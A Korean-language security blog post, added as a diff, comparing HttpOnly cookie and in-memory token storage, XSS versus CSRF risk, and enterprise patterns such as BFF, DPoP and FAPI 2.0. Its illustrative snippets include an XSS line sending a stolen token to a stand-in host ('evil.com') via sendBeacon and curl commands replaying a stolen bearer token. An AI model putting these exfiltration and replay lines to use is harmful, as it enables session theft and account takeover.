@@ -1,0 +1,252 @@
+---
+title: '토큰은 어디에 저장해야 할까 — 쿠키 vs 메모리, 엔터프라이즈의 선택'
+date: '2026-02-16'
+tags: ['security', 'cookie', 'oauth', 'enterprise']
+---
+
+"쿠키에 넣으면 DevTools에서 바로 보이는데, 메모리에 넣으면 안 보이잖아. 그러면 메모리가 더 안전한 거 아냐?"
+
+프론트엔드 인증을 설계할 때 한 번쯤 떠오르는 의문입니다. DevTools의 Application 탭을 열면 쿠키 값이 그대로 노출되는 반면, JavaScript 변수에 담긴 토큰은 어디서도 직접 확인할 수 없습니다. 직관적으로는 "보이지 않는 게 안전하다"고 느낄 수 있습니다.
+
+결론부터 말하면, **"보이냐 안 보이냐"는 보안 판단 기준이 아닙니다.** 진짜 기준은 따로 있고, 엔터프라이즈는 이 문제를 완전히 다른 관점에서 바라봅니다.
+
+## "보인다"는 게 왜 중요하지 않은가
+
+DevTools에서 쿠키가 보이려면 **사용자 본인이 자신의 브라우저를 열어야** 합니다. 이건 위협 모델에서 "물리적 접근"에 해당합니다. 이 수준의 접근이 가능한 공격자는 메모리의 토큰도 읽을 수 있습니다. Chrome의 V8 힙에서 JavaScript 문자열을 추출하는 메모리 포렌식 기법은 이미 문서화되어 있습니다 (SpecterOps, 2026년 2월).
+
+그리고 둘 다 **만료 시간이 존재합니다.** 쿠키에 15분 만료를 걸든, 메모리 토큰에 15분 만료를 걸든, 만료되면 쓸모없는 값입니다. "보인다"고 해서 더 오래 쓸 수 있는 것도 아닙니다.
+
+실제 웹 보안에서 중요한 건 DevTools의 가시성이 아니라 **원격 공격자(XSS, CSRF)에 대한 방어**입니다. 여기서 두 방식은 완전히 다른 보안 특성을 가지며, 그 차이를 만드는 건 딱 두 가지입니다.
+
+## 진짜 보안 기준: 자동 전송 vs JS 접근성
+
+| 기준 | 쿠키 | 메모리 (JS 변수) |
+|:--|:--|:--|
+| 요청에 자동으로 붙나 | 도메인이 일치하면 **자동 전송** | 코드가 명시적으로 헤더에 첨부 |
+| JavaScript로 읽히나 | `HttpOnly`면 **읽기 불가** | 같은 실행 컨텍스트의 코드가 **읽기 가능** |
+
+이 두 가지 속성이 각각의 취약점을 결정합니다.
+
+**자동 전송 → CSRF 위험.** 브라우저가 쿠키를 자동으로 붙이기 때문에, 악성 사이트가 요청을 위조할 수 있습니다. 메모리 토큰은 `Authorization` 헤더에 코드가 직접 첨부하므로 CSRF가 원천적으로 불가능합니다.
+
+**JS 접근성 → XSS 토큰 탈취 위험.** `HttpOnly` 쿠키는 JavaScript에서 읽을 수 없습니다. 메모리 토큰은 XSS 스크립트가 직접 읽어서 외부로 유출할 수 있습니다.
+
+```
+쿠키:   CSRF에 약하고, XSS 토큰 탈취에 강하다
+메모리: CSRF에 면역이고, XSS 토큰 탈취에 약하다
+```
+
+**"보이냐 안 보이냐"가 아니라 "자동으로 전송되냐" + "JS로 읽히냐"가 본질적인 차이입니다.**
+
+## XSS가 뚫리면: 리모컨을 빌리는 것 vs 열쇠를 복사하는 것
+
+두 방식 모두 XSS가 뚫리면 세션을 "이용"당합니다. 하지만 피해의 성격이 완전히 다릅니다.
+
+### HttpOnly 쿠키 — 리모컨을 잠깐 빌려 쓰는 것
+
+```javascript
+// XSS 스크립트가 피해자의 브라우저 안에서 대리 요청
+fetch('/api/transfer', {
+  method: 'POST',
+  body: JSON.stringify({ to: 'attacker', amount: 10000 })
+});
+// 쿠키가 자동으로 붙으니 요청은 성공
+// 하지만 토큰 값 자체는 모름
+```
+
+- 피해자 브라우저 안에서만 **대리 요청** 가능
+- 토큰 값을 **외부로 가져갈 수 없음**
+- 피해자가 탭을 닫으면 **공격 종료**
+
+### 메모리 토큰 — 열쇠를 복사해 가는 것
+
+```javascript
+// XSS 스크립트가 토큰 값을 외부로 유출
+const stolen = window.__accessToken;
+navigator.sendBeacon('https://evil.com/collect', stolen);
+```
+
+```bash
+# 공격자가 자기 컴퓨터에서 자유롭게 사용
+curl -H "Authorization: Bearer stolen_token" https://api.target.com/users
+curl -H "Authorization: Bearer stolen_token" https://api.target.com/transfer
+# 자동화 스크립트로 대량 요청도 가능
+```
+
+- 토큰을 **외부로 유출** → 공격자의 환경에서 사용
+- 피해자가 브라우저를 꺼도 **만료까지 공격 지속**
+- 자동화 스크립트로 대량 요청, 데이터 수집 전부 가능
+
+XSS가 뚫렸을 때 HttpOnly 쿠키는 피해가 **실시간, 해당 세션 한정**이고, 메모리 토큰은 피해가 **만료까지 지속, 외부에서 무제한**입니다.
+
+## 그래서 XSS와 CSRF 중 뭐가 더 위험한가
+
+MITRE/CISA 기준 2024년 가장 위험한 소프트웨어 약점에서 **XSS가 1위**, CSRF가 3위입니다. 단순한 순위 차이가 아닙니다.
+
+**CSRF는 blind attack입니다.** 요청만 보낼 수 있고, 응답을 읽을 수 없습니다. 할 수 있는 게 제한적입니다.
+
+**XSS는 마스터 키입니다.** same-origin에서 실행되니까 토큰 탈취, CSRF 방어 무력화, 키 입력 가로채기, 피싱 폼 삽입, 인증된 API 무제한 호출이 전부 가능합니다. XSS가 뚫리면 CSRF 토큰도 DOM에서 읽어버리기 때문에 CSRF 방어가 통째로 무의미해집니다.
+
+이 논리를 따라가면:
+
+1. XSS가 CSRF보다 훨씬 위험하다
+2. 메모리 토큰은 XSS에 뚫린다 (토큰 유출 → 외부 사용)
+3. HttpOnly 쿠키는 XSS에도 토큰 값을 못 빼간다 (세션 이용만 가능)
+4. 쿠키의 CSRF 위험은 `SameSite=Lax` 하나로 대부분 막힌다
+
+**→ XSS 피해 관점에서는 HttpOnly 쿠키 + CSRF 방어가 메모리보다 더 안전한 선택입니다.**
+
+## 하이브리드는 만능인가
+
+업계에서 자주 권장되는 하이브리드 패턴은 이렇습니다.
+
+- **Refresh token**: `HttpOnly`, `Secure`, `SameSite=Strict` 쿠키에 저장
+- **Access token**: JavaScript 변수(메모리)에 저장, 수명 5~15분
+
+```javascript
+// 로그인 시: 서버가 refresh token을 HttpOnly 쿠키로 설정
+let accessToken = loginResponse.accessToken; // 메모리에만 존재
+
+// API 호출 시: Authorization 헤더로 전송 (CSRF 면역)
+fetch('/api/data', {
+  headers: { Authorization: `Bearer ${accessToken}` }
+});
+
+// 페이지 새로고침 시: refresh 쿠키로 access token 재발급
+accessToken = await refreshAccessToken();
+```
+
+하이브리드의 의도는 명확합니다. refresh token은 `HttpOnly`로 XSS 탈취를 막고, access token은 헤더 전송으로 CSRF를 제거합니다. 각각의 강점을 조합한 것입니다.
+
+하지만 **access token이 메모리에 있는 동안은 XSS에 그대로 노출됩니다.** 탈취된 access token은 5~15분이지만, 그 시간 동안 공격자가 외부에서 자유롭게 사용할 수 있습니다. 하이브리드의 목적은 "XSS를 막겠다"가 아니라 **"XSS가 뚫렸을 때 피해 시간을 제한하겠다"**입니다.
+
+"그런데 쿠키에도 만료 시간 걸면 똑같은 거 아닌가?" — 맞습니다. 수명 제한은 쿠키에도 똑같이 적용할 수 있습니다. 하이브리드가 쿠키 단독보다 나은 점은 수명이 아니라 **API 호출에서 CSRF를 구조적으로 제거한다는 것**입니다.
+
+| | HttpOnly 쿠키만 | 하이브리드 |
+|:--|:--|:--|
+| XSS 토큰 탈취 | **불가** | 가능 (만료까지 외부 사용) |
+| CSRF | 방어 필요 (`SameSite` + CSRF 토큰) | **면역** |
+| 구현 복잡도 | 낮음 | 높음 |
+
+결국 트레이드오프입니다. XSS 피해를 최소화하고 싶으면 HttpOnly 쿠키, CSRF를 구조적으로 제거하고 싶으면 하이브리드. 어느 쪽이든 완벽하지 않습니다.
+
+## 엔터프라이즈 보안 표준들의 합의
+
+### OWASP: "JavaScript가 읽을 수 있는 곳에 토큰을 두지 마라"
+
+> "Do not store session identifiers in local storage as the data is always accessible by JavaScript. Cookies can mitigate this risk using the httpOnly flag."
+>
+> — OWASP HTML5 Security Cheat Sheet
+
+OWASP ASVS v4.0 V3.4.1은 쿠키 기반 세션 토큰에 `Secure`, `HttpOnly`, `SameSite` 속성을 **필수**로 요구합니다.
+
+### NIST SP 800-63B: "안전하지 않은 위치에 놓지 마라"
+
+> "Secrets used for session binding SHOULD NOT be placed in insecure locations such as HTML5 Local Storage due to the potential exposure of local storage to cross-site scripting (XSS) attacks."
+
+세션 시크릿은 애플리케이션 재시작 시 지속되어서도 안 됩니다.
+
+### IETF OAuth Working Group: "토큰을 브라우저에 보내지 마라"
+
+draft-ietf-oauth-browser-based-apps-26 (2025년 12월)의 권고 우선순위:
+
+1. **가장 좋은 방법**: Token-mediating backend (BFF) — 토큰이 브라우저에 도달하지 않음
+2. **차선**: Authorization Code + PKCE, 짧은 수명 토큰 + refresh token rotation
+3. **피해야 함**: localStorage나 JavaScript 접근 가능한 영구 저장소에 토큰 저장
+
+이 문서의 가장 냉정한 지적:
+
+> "Even if the application finds a storage mechanism that completely isolates stored tokens, an attacker with XSS will still be able to request a new set of tokens."
+
+저장소를 아무리 격리해도, XSS가 뚫리면 공격자가 새 토큰을 직접 발급받을 수 있습니다.
+
+### FAPI 2.0: 금융권의 답 — "탈취해도 못 쓰게 만들어라"
+
+Financial-Grade API 2.0은 저장 위치가 아닌 **토큰 자체**에 답을 찾습니다. Bearer 토큰을 허용하지 않고, 모든 access token에 발신자 제약(sender-constraining)을 겁니다.
+
+```
+FAPI 2.0 필수 요구사항:
+- Sender-constrained access tokens (mTLS 또는 DPoP)
+- Pushed Authorization Requests (PAR)
+- PKCE with S256
+- 공개 클라이언트(Public Client) 사용 금지
+```
+
+토큰이 탈취되어도 공격자의 환경에서는 사용할 수 없습니다. 한국, 영국, 호주, 브라질, EU의 오픈뱅킹에서 채택하고 있습니다.
+
+## 저장 위치 논쟁의 끝: 안 보내는 게 답이다
+
+쿠키든 메모리든, 브라우저에 토큰이 존재하는 한 완벽한 방어는 없습니다. 엔터프라이즈가 도달한 최종 결론은 **토큰을 브라우저에 보내지 않는 것**입니다.
+
+### BFF (Backend-for-Frontend) 패턴
+
+```
+브라우저 ←→ BFF 서버 ←→ API 서버
+   │              │
+   │ 세션 쿠키     │ access token
+   │ (HttpOnly)   │ (서버 메모리/Redis)
+```
+
+BFF 서버가 OAuth 인증을 대행하고, 토큰을 서버 측 세션(Redis 등)에 저장합니다. 브라우저에는 암호화된 `HttpOnly` 세션 쿠키만 전달됩니다. 토큰이 브라우저에 없으므로 XSS가 뚫려도 탈취할 토큰 자체가 없습니다. **저장 위치 논쟁이 사라집니다.**
+
+### DPoP (Demonstration of Proof-of-Possession) — RFC 9449
+
+BFF를 쓸 수 없는 환경에서 토큰이 탈취되어도 쓸 수 없게 만드는 메커니즘입니다.
+
+```
+1. 클라이언트가 공개키/비밀키 쌍 생성 (Web Crypto API)
+2. 토큰 요청 시 DPoP proof JWT (비밀키로 서명) 첨부
+3. 인가 서버가 access token을 클라이언트의 공개키에 바인딩
+4. API 호출마다 DPoP proof를 함께 전송
+5. 토큰만 탈취해도 비밀키 없이는 사용 불가
+```
+
+Auth0(Early Access), Okta(프로덕션), Kong Gateway Enterprise 3.7+에서 지원합니다. 다만 브라우저 환경에서는 XSS로 Web Crypto API의 키에 접근할 수 있어 완전하지 않습니다. DPoP는 BFF나 네이티브 앱에서 가장 효과적입니다.
+
+### DBSC (Device Bound Session Credentials) — 미래
+
+Google이 개발 중인 기술로, TPM(하드웨어 보안 모듈)에 비밀키를 저장하여 세션을 디바이스에 바인딩합니다. 토큰이 탈취되어도 다른 디바이스에서 사용 불가. Chrome 135에서 origin trial 진행 중이며, Windows + TPM 환경에서 동작합니다.
+
+## 엔터프라이즈 보안 수준별 선택
+
+| 보안 수준 | 아키텍처 | 토큰 위치 | 적용 분야 |
+|:--|:--|:--|:--|
+| 최고 | BFF + FAPI 2.0 + DPoP/mTLS | 서버만, 브라우저는 암호화된 세션 쿠키 | 금융, 의료, 정부 |
+| 높음 | BFF | 서버, 브라우저는 HttpOnly 세션 쿠키 | 엔터프라이즈 SaaS |
+| 중간 | HttpOnly 쿠키 + CSRF 방어 | 쿠키 (HttpOnly + SameSite) | 일반 웹 서비스 |
+| 중간 | 하이브리드 | refresh: 쿠키, access: 메모리 | CSRF 제거가 중요한 SPA |
+| 피해야 함 | localStorage/sessionStorage | — | — |
+
+## 결론
+
+토큰 저장 위치를 선택할 때 "보이느냐 안 보이느냐"는 기준이 아닙니다.
+
+**진짜 기준은 두 가지입니다:**
+- **자동으로 전송되느냐** → 되면 CSRF 위험 (쿠키)
+- **JavaScript로 읽히느냐** → 읽히면 XSS로 토큰 유출 (메모리)
+
+XSS는 CSRF보다 훨씬 위험하고, XSS가 뚫렸을 때 HttpOnly 쿠키는 세션을 **빌려 쓰이는 것**(리모컨)이지만 메모리 토큰은 **복사되어 가져가지는 것**(열쇠)입니다. 이 차이가 두 방식의 본질적인 격차입니다.
+
+엔터프라이즈의 사고방식은 **"어디에 저장할까"가 아니라 "뚫렸을 때 피해를 어떻게 제한할까"**입니다.
+
+1. **XSS 자체를 막는다** — CSP, Trusted Types, 프레임워크 자동 이스케이핑 (1순위)
+2. **뚫려도 시간을 줄인다** — 짧은 토큰 만료 (2순위)
+3. **탈취해도 못 쓰게 만든다** — DPoP, mTLS (3순위)
+4. **토큰을 브라우저에 안 보낸다** — BFF (최종 답)
+
+저장 위치 논쟁의 끝은 **"안 보내는 게 답"**입니다.
+
+## 참고 자료
+
+- [OWASP ASVS v4.0 V3 — Session Management](https://github.com/OWASP/ASVS)
+- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
+- [NIST SP 800-63B Section 7.1](https://pages.nist.gov/800-63-3/sp800-63b.html)
+- [IETF draft-ietf-oauth-browser-based-apps-26](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps)
+- [RFC 9700 — OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/rfc9700/)
+- [RFC 9449 — OAuth 2.0 DPoP](https://datatracker.ietf.org/doc/html/rfc9449)
+- [FAPI 2.0 Specifications](https://oauth.net/fapi/)
+- [Auth0 — Token Storage](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)
+- [Auth0 — The Backend for Frontend Pattern](https://auth0.com/blog/the-backend-for-frontend-pattern-bff/)
+- [Curity — Token Handler Pattern](https://curity.io/resources/learn/the-token-handler-pattern/)
+- [Mercari Engineering — Building Secure Apps Using Web Workers](https://engineering.mercari.com/en/blog/entry/20220930-building-secure-apps-using-web-workers/)
+- [Chrome — Device Bound Session Credentials](https://developer.chrome.com/docs/web-platform/device-bound-session-credentials)
